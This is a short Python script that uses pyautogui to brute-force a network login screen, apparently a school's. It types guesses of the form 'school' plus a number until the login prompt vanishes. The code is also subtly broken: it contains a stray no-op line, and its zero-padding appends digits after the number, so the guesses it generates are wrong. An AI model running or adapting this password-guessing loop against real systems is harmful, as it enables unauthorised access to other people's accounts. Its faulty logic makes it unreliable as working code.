import pyautogui

pyautogui.screenshot("NetworkLogin.jpeg")

Entry = False
num = 0

while Entry == False:

    num = str(num)
    while len(num) < 3:
        num += "0"

    pyautogui.school000
    pyautogui.typewrite("school" + num)
    pyautogui.press("enter")

    check = bool(pyautogui.locateOnScreen("NetworkLogin.jpeg"))

    if not check:
        Entry = True
    num = int(num) + 1